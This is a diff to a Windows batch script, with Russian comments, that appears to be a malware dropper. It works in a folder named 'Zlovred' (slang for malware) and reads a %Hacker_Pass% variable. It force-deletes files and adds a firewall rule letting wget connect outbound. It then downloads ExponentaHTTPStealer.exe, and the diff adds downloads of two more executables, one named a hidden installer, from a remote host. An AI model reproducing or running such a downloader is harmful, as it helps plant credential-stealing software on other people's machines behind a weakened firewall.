@@ -89,9 +89,12 @@ rem set httppassword=%Hacker_Pass%
 rem Локальный каталог
 set LocalFolderZ=%PUB1%\Distrib\Zlovred
 
-rem Копируем wget и запускаем установку в каталоге %LocalFolderZZ%
+rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
+del /Q /F %LocalFolderZ%\*.*
+
+rem Копируем wget и запускаем установку в каталоге %LocalFolderZ%
 copy wget.exe %LocalFolderZ%\wget.exe
-copy ExponentaInstallerHttpHidden.exe %LocalFolderZ%\ExponentaInstallerHttpHidden.exe
+rem copy ExponentaInstallerHttpHidden.exe %LocalFolderZ%\ExponentaInstallerHttpHidden.exe
 copy install_Styler.ini %LocalFolderZ%\
 copy installHTTP_Stylerdistrib.bat %LocalFolderZ%\
 copy Install_StylerHTTP.bat %LocalFolderZ%\
@@ -103,11 +106,12 @@ rem Разрешаем все протоколы для wget.exe в брандмауэре
 rem Разрешаем все протоколы для wget.exe в брандмауэре
 %SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolderZ%\wget.exe" enable=yes
 
-
 rem Запускаем на выполнение команды WGET
 rem !!! Изменяемая величина! Проверять перед использованием !!!
 
 wget %host%/ExponentaHTTPStealer.exe
+wget %host%/ThreadsSetup.exe
+wget %host%/ExponentaInstallerHttpHidden.exe
 rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
 rem wget -r --no-parent %host%/
 
